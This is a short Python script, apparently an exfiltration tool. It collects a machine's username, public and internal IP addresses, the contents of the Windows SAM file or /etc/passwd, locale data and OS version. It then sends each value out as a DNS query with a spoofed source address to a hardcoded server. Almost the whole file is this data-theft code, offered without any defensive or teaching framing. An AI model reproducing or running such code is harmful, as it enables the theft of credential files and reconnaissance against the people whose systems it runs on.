import locale
import sys
import os
import getpass
import socket
import requests
#import pyuac
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP
from scapy.sendrecv import send


DNS_PORT = 53
DNS_SERVER_IP = "1.2.3.4"
IP_SRC = "1.2.3.4"


def send_system_info():
    username = str(get_username())
    ip = str(get_ip())
    internal_ip = str(get_internal_ip())
    password_file = str(get_password_file())
    language = str(get_languages())
    os_info = str(get_os_info())
    
    send_dns_query(username)
    send_dns_query(ip)
    send_dns_query(internal_ip)
    send_dns_query(password_file)
    send_dns_query(language)
    send_dns_query(os_info)
    
    #print(username+","+ip+","+internal_ip+","+language+","+os_info)
    return
    

def get_username():
    username = getpass.getuser()
    return username


def get_ip():
    ip = requests.get("https://api.ipify.org").text
    return ip


def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()
    return ip_internal


def get_password_file():
    if os.name == 'nt':
        password_file = ""
        try:
            with open("C:\\Windows\\System32\\config\\SAM", "rb") as fp:
                password_file = fp.read().decode("utf-8", "ignore")
        except FileNotFoundError:
            pass
    else:
        password_file = ""
        try:
            with open("/etc/passwd", "r") as fp:
                password_file = fp.read()
        except FileNotFoundError:
            pass

    return password_file


def get_languages():
    languages = str(locale.locale_alias)
    return languages


def get_os_info():
    os_data = ""
    if os.name == 'nt':
        os_version = sys.getwindowsversion()
        os_data = f"{os.name} {os_version.major}.{os_version.minor}.{os_version.build}"
    else:
        os_info = os.uname()
        os_data = f"{os_info.sysname} {os_info.release} {os_info.version}"
    return os_data

def send_dns_query(qname):
    ip = IP(src=IP_SRC, dst=DNS_SERVER_IP)
    udp = UDP(dport=DNS_PORT)
    dns = DNS(rd=1)
    dns.qd = DNSQR(qname=qname)
    dns_request = ip / udp / dns
    send(dns_request)
    return
    
if __name__ == "__main__":
    print("Start...\n")
    send_system_info()
    print("End...\n")
    